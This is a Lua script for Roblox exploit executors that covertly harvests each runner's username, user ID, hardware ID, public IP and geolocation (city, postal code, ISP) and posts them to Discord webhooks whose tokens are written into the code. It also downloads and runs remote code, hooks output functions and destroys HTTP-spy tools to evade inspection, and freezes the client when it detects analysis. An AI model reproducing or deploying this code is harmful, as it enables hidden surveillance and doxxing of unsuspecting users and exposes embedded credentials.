if not WebhookHood then return end

local function generateRandomString(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local randomString = ""
    for i = 1, length do
        randomString = randomString .. chars:sub(math.random(1, #chars), math.random(1, #chars))
    end
    return randomString
end
local randomString = generateRandomString(10)

local functions = {
    rconsoleprint,
    print,
    setclipboard,
    rconsoleerror,
    rconsolewarn,
    warn,
    error
}
for _, func in next, functions do
    local oldFunc
    oldFunc = hookfunction(
        func,
        newcclosure(
            function(...)
                local args = {...}
                for _, arg in next, args do
                    if tostring(arg):find(randomString) then
                        while true do end
                    end
                end
                return oldFunc(...)
            end
        )
    )
end

local IsNotSpyFound = true
local success, err = pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/" .. randomString .. "/raw", true))()
end)

if not success then
-- do nothing 
end

local function searchGuis()
    local function checkElement(e)
        return e.Name:find(randomString) or 
               (e:IsA("TextLabel") or e:IsA("TextButton") or e:IsA("TextBox")) and 
               e.Text:find(randomString)
    end

    for _, gui in pairs({game.Players.LocalPlayer.PlayerGui, game.CoreGui}) do
        for _, screenGui in pairs(gui:GetChildren()) do
            if screenGui:IsA("ScreenGui") then
                for _, element in pairs(screenGui:GetDescendants()) do
                    if checkElement(element) then
	                    IsNotSpyFound = false
	                    element:Destroy()
                        while true do end
                        game:Shutdown()
                        return
                    end
                end
            end
        end
    end
end
wait()
searchGuis()

if not IsNotSpyFound then while true do end

local InfoHookUrl = "https://discord.com/api/webhooks/1309827501165641789/y9WeWf4xITs49a4tow83hO00YgcUc5XHadn9BnvPMQLENSWudEedCo3T6XMn83FWN_y4"
local IpHookUrl = "https://discord.com/api/webhooks/1309827725057327135/xjtCFRyrHuY6PC4MeVIKYyJMHFCnNKWCZYrInklKThNtZVELtacEFdLB-5V8n-UfagQG"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local Stats = game:GetService("Stats")

local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
local Hwid = RbxAnalyticsService:GetClientId()
local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local GameName = GameInfo.Name
local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local function detectExecutor()
    return identifyexecutor()
end

local function getNameTag()
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("Head") and character.Head:FindFirstChild("Nametag") then
        local nameTagTextLabel = character.Head.Nametag:FindFirstChild("TextLabel")
        if nameTagTextLabel then
            return nameTagTextLabel.Text
        end
    end
    return "N/A"
end

local CheckedInfo = false
local function webHookInfo()
	if CheckedInfo then return end
	CheckedInfo = true
	local function createWebhookData()
	    if not WebhookScript then WebhookScript = "N/A" end
	    local executor = detectExecutor()
	    local date = os.date("%m/%d/%Y")
	    local time = os.date("%X")
	    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
	    local playerLink = "https://www.roblox.com/users/" .. UserId
	    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
	    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
	
	    local nameTag = getNameTag()
	
	    local data = {
	        username = "Execution Notification",
	        avatar_url = "https://i.ytimg.com/vi/vtCohrTRZMU/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLD46_TbYXjBkGLYBErfTWCftRcqQA",
	        embeds = {
	            {
	                title = "📃 Script Information",
	                description = "Script executed: ".. WebhookScript,
	                color = tonumber("0x000000")
	            },
	            {
	                title = "🎮 Game Information",
	                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
	                color = tonumber("0x2ecc71")
	            },
	            {
	                title = "👤 Player Information",
	                description = string.format(
	                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms\n**NameTag:** %s",
	                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping, nameTag
	                ),
	                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
	            },
	            {
	                title = "🌐 HWID",
					description = string.format(
					    "**HWID:** `%s`",
					    Hwid
					),
					color = tonumber("0xe74c3c")
	            },
	            {
	                title = "⚙️ Technical Details",
	                description = string.format(
	                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
	                    executor, jobIdLink, mobileJoinLink
	                ),
	                color = tonumber("0x95a5a6"),
	                footer =
	                { 
	                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
	                }
	            }
	        }
	    }
	    return HttpService:JSONEncode(data)
	end
	
	local function sendWebhook(webhookUrl, data)
	    local headers = {["Content-Type"] = "application/json"}
	    local request = http_request or request or HttpPost or syn.request
	    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
	    request(webhookRequest)
	end
	
	local webhookData = createWebhookData()
	sendWebhook(InfoHookUrl, webhookData)
end


local HookedSkidFlag = false
local function HookSkid()
	if HookedSkidFlag then return end
	HookedSkidFlag = true
	local function createWebhookData()
	    if not WebhookScript then WebhookScript = "N/A" end
	    local executor = detectExecutor()
	    local date = os.date("%m/%d/%Y")
	    local time = os.date("%X")
	    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
	    local playerLink = "https://www.roblox.com/users/" .. UserId
	    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
	    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
	
	    local nameTag = getNameTag()
	
	    local data = {
	        username = "Skidder detector",
	        avatar_url = "https://i.ytimg.com/vi/vtCohrTRZMU/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLD46_TbYXjBkGLYBErfTWCftRcqQA",
	        embeds = {
	            {
	                title = "📃 Script Information",
	                description = "Script executed: ".. WebhookScript,
	                color = tonumber("0x000000")
	            },
	            {
	                title = "🎮 Game Information",
	                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
	                color = tonumber("0x2ecc71")
	            },
	            {
	                title = "👤 Player Information",
	                description = string.format(
	                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms\n**NameTag:** %s",
	                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping, nameTag
	                ),
	                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
	            },
	            {
	                title = "🌐 Location & Network",
	                description = string.format(
	                    "**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
	                    GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
	                ),
	                color = tonumber("0xe74c3c")
	            },
	            {
	                title = "⚙️ Technical Details",
	                description = string.format(
	                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
	                    executor, jobIdLink, mobileJoinLink
	                ),
	                color = tonumber("0x95a5a6"),
	                footer =
	                { 
	                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time)
	                }
	            }
	        }
	    }
	    return HttpService:JSONEncode(data)
	end
	
	local function sendWebhook(webhookUrl, data)
	    local headers = {["Content-Type"] = "application/json"}
	    local request = http_request or request or HttpPost or syn.request
	    local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
	    request(webhookRequest)
	end
	
	local webhookData = createWebhookData()
	sendWebhook(IpHookUrl, webhookData)
end
local BlacklistedHWID = {
    "0a7d44b4-5337-4c06-b1ee-f6635f7c5dcd",
    "3bbbee27-863e-449f-a881-a9c83b112eb4",
    "c665f5c0-3c42-4978-a056-0adfb7116f38",
    "43e2fc42-5264-45da-9245-cc55ac6dae14",
    "e37edf1a-6bbb-4d76-8a39-3a29c7295c09",
    "530dfe2c-7a5f-4f69-b661-1ec087564d00",
    "4d4f4fed-d86c-4c7b-8fe8-906e61015420"
}



local playerHwid = game:GetService("RbxAnalyticsService"):GetClientId()
if playerHwid then
	if table.find(BlacklistedHWID, playerHwid) then
	    while true do setclipboard("you have been blacklist for trying to crack our script, you can contact to us if you got a false report, give enough credit.") end
	    game:Shutdown()
	end
end


if not ProtectedHttps then
	ProtectedHttps = {
		"ðŸ‘½ðŸ‘½ðŸ‘½ðŸ‘½ðŸ‘½ðŸ‘½123Abc"
	}
end
local OrginalHttps = {
	randomString,
    "172973020",
    "General-No.172973020",
    "webhooks",
    "1308728279271866409"
}

for _, func in next, functions do
    local oldFunc
    oldFunc = hookfunction(
        func,
        newcclosure(
            function(...)
                local args = {...}
                for _, arg in next, args do
                    -- Check against both OrginalHttps and ProtectedHttps
                    for _, url in ipairs(OrginalHttps) do
                        if tostring(arg):find(url) then
                            HookSkid()
                            while true do end
                        end
                    end
                    
                    for _, url in ipairs(ProtectedHttps) do
                        if tostring(arg):find(url) then
                            HookSkid()
                            while true do end
                        end
                    end
                end
                return oldFunc(...)
            end
        )
    )
end





setmetatable(
    _G,
    {
        __newindex = function(t, i, v)
            if tostring(i) == "ID" then
	            HookSkid()
                while true do end return 
            end
        end
    }
)

local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
local coreGui = game.CoreGui

local function checkDescendant(descendant)
    if descendant:IsA("TextLabel") or descendant:IsA("TextBox") or descendant:IsA("TextButton") then
        for _, name in ipairs(OrginalHttps) do
	        spawn(function ()
	            if string.find(descendant.Text, name) or descendant.Name == name then
					descendant:Destroy()
					HookSkid()
	                while true do end return 
	            end
			end)
        end
        for _, name in ipairs(ProtectedHttps) do
	        spawn(function()
	            if string.find(descendant.Text, name) or descendant.Name == name then
					descendant:Destroy()
					HookSkid()
	                while true do end return 
	            end
	        end)
		end
    end
end

playerGui.DescendantAdded:Connect(checkDescendant)
coreGui.DescendantAdded:Connect(checkDescendant)

spawn(function()
	while wait() do
		local HttpSpy = nil
		for _, gui in pairs({game.CoreGui, game.Players.LocalPlayer:WaitForChild("PlayerGui")}) do
			for _, child in pairs(gui:GetChildren()) do
				if child.Name:find("HttpSpy") or child.Name:find("Http Spy") or child.Name:find("Https") or child.Name:find("Http") then
					HttpSpy = child
					break
				end
			end
			if HttpSpy then break end
		end

		if HttpSpy then
			HttpSpy:Destroy()
			HookSkid()
			while true do end
		end
	end
end)

webHookInfo()
if detectExecutor() and detectExecutor() == "RobloxStudio.exe" then
	while true do end
	game:Shutdown()
end

